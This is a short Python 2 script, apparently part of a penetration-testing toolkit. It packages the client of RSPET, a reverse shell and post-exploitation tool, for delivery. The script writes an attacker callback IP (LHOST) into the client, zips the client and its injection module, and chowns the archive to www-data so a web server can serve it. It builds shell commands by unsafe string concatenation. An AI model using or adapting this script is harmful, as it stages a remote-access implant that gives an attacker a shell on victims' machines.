#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2017, Carlos Polop Martin <carlospolop[at]gmail.com
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted
# provided that the following conditions are met:
#
# Redistributions of source code must retain the above copyright notice, this list of conditions and
# the following disclaimer.
#
# Redistributions in binary form must reproduce the above copyright notice, this list of conditions
# and the following disclaimer in the documentation and/or other materials provided with the
# distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
# IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
# FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
# IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
# OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import os
import subprocess
import shutil
import sys
from config_paths import *

main_save_path = main_path+"RSPET/"

def main_directory():
    if os.path.exists(main_save_path):
        shutil.rmtree(main_save_path)
    os.makedirs(main_save_path)


###############
## MAIN PART ##
###############
print ""
print "#################################################"
print "RSPET:"
if len(sys.argv) > 1:
    if ip_validator(sys.argv[1]):
        LHOST = sys.argv[1]
    else:
        print "Give a correct Ip address"
        exit(-1)
else:
    LHOST = autoLHOST()
    print "Using IP: "+LHOST

print "Default RSPET's port is 9000, change it in pupy.conf"
main_directory()

print ""
print "#################################################"
print "MOVING RSPET:"
print "-------------------------------------------------"
try:
    subprocess.check_output("echo "+ LHOST +" > "+ rspet_path +"Client/ip.txt", shell=True)
    os.chdir(rspet_path)
    comando = "zip "+ main_save_path +"rspet.zip Client/pinject/* Client/*"
    print comando
    subprocess.check_output(comando, shell=True)
except subprocess.CalledProcessError as e:
    print "Couldn't compress and move the folder"
print "_________________________________________________"
os.system("chown www-data -R "+main_save_path)
